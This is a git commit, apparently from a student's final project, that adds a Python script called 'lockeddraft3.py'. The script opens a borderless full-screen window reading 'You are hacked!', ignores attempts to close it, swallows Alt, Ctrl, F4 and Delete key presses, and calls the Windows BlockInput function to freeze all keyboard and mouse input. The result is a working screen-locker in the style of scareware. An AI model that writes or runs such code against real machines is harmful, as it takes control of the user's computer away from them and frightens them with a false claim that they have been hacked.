3bb655918006bb3bdbba5dcdaa3079290f43790c
graham-edwards <157263741+graham-edwards@users.noreply.github.com>
2024-04-29 12:11:02 -0400

    Create lockeddraft3.py

---
+++ finalproject/lockeddraft3.py
@@ -0,0 +1,32 @@
+import tkinter as tk
+import ctypes
+
+class HackedGUI:
+    def __init__(self):
+        self.root = tk.Tk()
+        self.root.title("You are hacked!")
+        self.root.protocol("WM_DELETE_WINDOW", self.prevent_closing)
+        self.root.bind("<Key>", self.prevent_key_press)
+        self.root.attributes("-fullscreen", True)  # fullscreen mode
+        self.root.resizable(False, False)  # prevent resizing
+        self.root.overrideredirect(True)  # remove title bar and borders
+
+        label = tk.Label(self.root, text="You are hacked!", font=("Arial", 24))
+        label.pack(pady=20)
+
+        # disable Alt+Tab, Alt+F4, Ctrl+Alt+Delete, etc.
+        ctypes.windll.user32.BlockInput(True)
+
+    def prevent_closing(self):
+        pass  # do nothing when user tries to close the window
+
+    def prevent_key_press(self, event):
+        if event.keysym in ["F4", "Delete", "Alt_L", "Alt_R", "Control_L", "Control_R"]:
+            return "break"  # prevent Alt+F4, Ctrl+Alt+Delete, etc.
+
+    def run(self):
+        self.root.mainloop()
+
+if __name__ == "__main__":
+    gui = HackedGUI()
+    gui.run()
